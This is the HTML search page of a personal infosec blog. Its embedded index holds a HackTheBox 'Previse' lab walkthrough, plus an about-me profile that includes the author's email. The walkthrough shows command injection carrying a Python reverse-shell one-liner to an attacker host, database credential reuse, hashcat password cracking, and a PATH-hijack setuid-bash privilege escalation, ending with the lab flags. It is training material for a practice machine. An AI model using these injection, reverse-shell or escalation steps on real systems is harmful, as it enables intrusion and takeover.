<!DOCTYPE html>
<html lang="en">
<head>
<title>Search :: RoundofThree</title>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="description"/>
<meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
<meta content="noodp" name="robots"/>
<link href="/search/" rel="canonical"/>
<link href="/assets/style.css" rel="stylesheet"/>
<link href="/img/apple-touch-icon-192x192.png" rel="apple-touch-icon"/>
<link href="/favicon.png" rel="shortcut icon"/>
<meta content="summary" name="twitter:card"/>
<meta content="" name="twitter:site"/>
<meta content="" name="twitter:creator"/>
<meta content="en" property="og:locale"/>
<meta content="website" property="og:type"/>
<meta content="Search" property="og:title"/>
<meta content="" property="og:description"/>
<meta content="/search/" property="og:url"/>
<meta content="RoundofThree" property="og:site_name"/>
<meta content="/favicon.png" property="og:image"/>
<meta content="2048" property="og:image:width"/>
<meta content="1024" property="og:image:height"/>
<link href="/search/index.xml" rel="alternate" title="RoundofThree" type="application/rss+xml"/>
</head>
<body class="orange">
<div class="container center headings--one-size">
<header class="header">
<div class="header__inner">
<div class="header__logo">
<a href="/">
<div class="logo">
    RoundofThree
  </div>
</a>
</div>
<div class="menu-trigger">menu</div>
</div>
<nav class="menu">
<ul class="menu__inner menu__inner--desktop">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href="/general">General</a></li>
<li><a href="/labs">Labs</a></li>
<li><a href="/research">Research</a></li>
<li><a href="/">Whoami</a></li>
</ul>
</nav>
</header>
<form action="/search/" id="search" method="get">
<label for="search-input" hidden="">Search site</label>
<input id="search-input" name="query" placeholder="Type here to search" type="text"/>
<input type="submit" value="search"/>
</form>
<div class="content">
<ul id="results">
<li>
        Enter a keyword above to search this site.
    </li>
</ul>
<script>
    window.store = {
        
        
        
        
        "\/tags\/hackthebox\/": {
            
            "title": "HackTheBox",
            "tags": [],
            "content": "", 
            "url": "\/tags\/hackthebox\/"
        },
        
        
        
        "\/labs\/": {
            
            "title": "Labs",
            "tags": [],
            "content": "", 
            "url": "\/labs\/"
        },
        
        
        
        "\/labs\/previse\/": {
            
            "title": "Previse - HackTheBox machine",
            "tags": ["HackTheBox",],
            "content": " Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.\nPart of this article is encrypted with password:\n  --- DON'T MODIFY THIS LINE --- Enumeration Previse walkthrough Enumeration  Nmap discovers tcp 22 and 80 ports. http://previse.htb/login.php is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt. Try with SQLi:  sqlmap -r request.txt -p password # (try with username too) No SQLi flaws discovered by sqlmap.\nFuzz the request path. wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt \u0026ndash;hc=404 http://previse.htb  Interesting files: index.php \u0026ndash; 302 Found \u0026ndash;\u0026gt; RESPONSE1 (see below for details) login.php config.php download.php \u0026ndash; 302 \u0026ndash;\u0026gt; login.php header.php footer.php status.php \u0026ndash; 302 \u0026ndash;\u0026gt; MySQL server is running! nav.php accounts.php \u0026ndash; 302 \u0026ndash;\u0026gt; Create an admin account files.php \u0026ndash; 302 \u0026ndash;\u0026gt; backup.zip YEAH!!! Site backups are very welcome!\nIntercept request packet with BurpSuite and intercept the response. See annotations above.  RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).\nThe only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php. MySQL credentials: root mySQL_p@ssw0rd!:) DBname: previse  But we can only access the database from localhost\u0026hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it\u0026rsquo;s specific to MySQL service.\nRevise all files. Look at logs.php. exec() promises a command injection opportunity.  The interesting part is here:\n$output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; We can trigger a reverse shell.\nTarget command: python log_process.py comma;python3 -c \u0026lsquo;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026ldquo;ATTACKER_IP\u0026rdquo;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo;\nChange the POST param in Burpsuite: delim=comma;python3+-c+\u0026lsquo;import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026ldquo;10.0.0.1\u0026rdquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo;\nTo escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:  mysql -u root -p Enter password: mySQL_p@ssw0rd!:) \u0026gt; use previse; \u0026gt; show tables; # accounts and files \u0026gt; select * from accounts; # columns id, username, password and created_at So, the username is m4lwhere and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.\nhashcat -a 0 -m 500 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Same but with \u0026ndash;show\nusername = m4lwhere hash = $1$ðŸ§‚llol$DQpmdvnb7EeuO6UaqRItf. password = ilovecody112235! Note that john doesn\u0026rsquo;t support non-printable characters in hash.\nSSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f  Privilege escalation  sudo -l reveals the script /opt/scripts/access_backup.sh.\n  Copy to local machine:\n  scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh . By looking at this file, we find command path vulnerability.\nWe can put a script named gzip in the current workdir and execute access_backup.sh as root.  cd /tmp # set gzip to be bash with setuid bit cat \u0026lt;\u0026lt; EOF \u0026gt; gzip #!/bin/bash cp /bin/bash /tmp/c chmod u+s /tmp/c EOF Now /tmp/c is a setuid bash.  /tmp/c -p (this flag sets the real userid as the effective userid) root.txt: 23c44ab8465e7ff51a5fab75847e088b\n ", 
            "url": "\/labs\/previse\/"
        },
        
        
        
        "\/tags\/": {
            
            "title": "Tags",
            "tags": [],
            "content": "", 
            "url": "\/tags\/"
        },
        
        
        
        "\/": {
            
            "title": "Whoami",
            "tags": [],
            "content": "RoundofThree (Zhuo Ying Jiang Li)  Email: zhuoyingjiangli@gmail.com Github HackTheBox. Rank: Pro Hacker. Global ranking (last updated 2021/09/05): 504 Leetcode. Ranking (last updated 2021/09/05): 3691 CV.pdf  Introduction I\u0026rsquo;m\nCoding in Golang, Python \u0026hellip;\nHacking in HackTheBox, Leetcode, Kaggle \u0026hellip;\nReading all things about infosec \u0026hellip;\nPlaying Genshin \u0026hellip;\nLoving ACG!\nSkills  In descending order of proficiency: Python, Golang, C++, Rust, Ruby, Java Web backend: Golang Gin, Ruby on Rails, Express Scripting: Python, Golang Windows Internals and forensics   Malware analysis (maldocs, js, powershell) and reverse engineering assembly Pentesting vulnerable boxes and networks at HackTheBox ML: Tensorflow, XGBoost, LightGBM, Optuna Artificial Intelligence Planning: PDDL Web frontend: VueJS 3, React Mobile app: React Native LaTex  Projects  Hacker tools and exploits  HTB machines writeups (encrypted) Automated baselining (Batchfile)   Web/Software development  MapReduce minimal implementation in Golang (MIT Distributed Systems 6.824). See official course page. Raft implementation in Golang (MIT Distributed Systems 6.824) Nyxeon (Golang Gin + VueJS 3 first project) King\u0026rsquo;s College London Chinese Alumni Association website CMS API and online payment (Ruby on Rails). Private. Online health monitoring and scheduling system (Ruby on Rails). School project. King\u0026rsquo;s College London Chinese Student Association WeChat miniprogram. Private. Bank scam honeypot web application (Ruby on Rails). School project. AirBnB market listing desktop application (JavaFX, first year coursework).   ML \u0026amp; CV \u0026amp; AI algorithms  Kaggle workflow: a template to clean, do feature engineering, model and ensemble (Python) Kaggle competitions repositories and notebooks (Python, ScikitLearn, Tensorflow, XGBoost, LightGBM) Sokoban solver using PDDL (OPTIC solver) Python scripts: watermark removal, DPLL SAT solver\u0026hellip; Google Hashcode: traffic planning (Python)    Experience  Hacker tools, techniques, exploits and incident handling training at SANS Institute GIAC GCIH certified Joined the GIAC Advisory Board King\u0026rsquo;s College London Computer Science First \u0026amp; Second Year Award King\u0026rsquo;s College London Computer Science with Management Award IB 45 points Silver medal at Iberoamerican Chemistry Olympics Silver medals at Spanish National Chemistry and Physics Olympics  ", 
            "url": "\/"
        },
        
        
        
        "\/research\/": {
            
            "title": "Researches",
            "tags": [],
            "content": "", 
            "url": "\/research\/"
        },
        
        
        
        "\/research\/test\/": {
            
            "title": "Test",
            "tags": [],
            "content": "", 
            "url": "\/research\/test\/"
        },
        
        
        
        "\/general\/": {
            
            "title": "Generals",
            "tags": [],
            "content": "", 
            "url": "\/general\/"
        },
        
        
        
        "\/general\/migration\/": {
            
            "title": "Migration from previous blog",
            "tags": [],
            "content": "It\u0026rsquo;s been a while since I last wrote for my personal blog. Last year, while I was in 2nd year of Bachelor, I wrote more articles about Data Structures and Algorithms, and little things I found to be fancy about pentesting. After a year of self teaching and research, I\u0026rsquo;m now focusing more on reverse engineering, malware analysis and using data science for faster analysis. There are so many things that I want to know better, but I struggle because they are undocumented, and that\u0026rsquo;s why I decided to retake this. This blog is mainly for my own tracking but I hope it\u0026rsquo;s helpful for others and that I will update this more often!\nThe old blog is still stored at the master branch of RoundofThree/roundofthree.github.io.\n", 
            "url": "\/general\/migration\/"
        },
        
        
        
        "\/categories\/": {
            
            "title": "Categories",
            "tags": [],
            "content": "", 
            "url": "\/categories\/"
        },
        
        
        
        "\/search\/": {
            
            "title": "Search",
            "tags": [],
            "content": "", 
            "url": "\/search\/"
        },
        
    }
</script>
<script src="/assets/lunr.min.js"></script>
<script src="/assets/search.js"></script>
</div>
<footer class="footer">
<div class="footer__inner">
<div class="copyright copyright--user">
<span>Â© 2021 RoundofThree</span>
</div>
</div>
</footer>
<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>
</div>
</body>
</html>
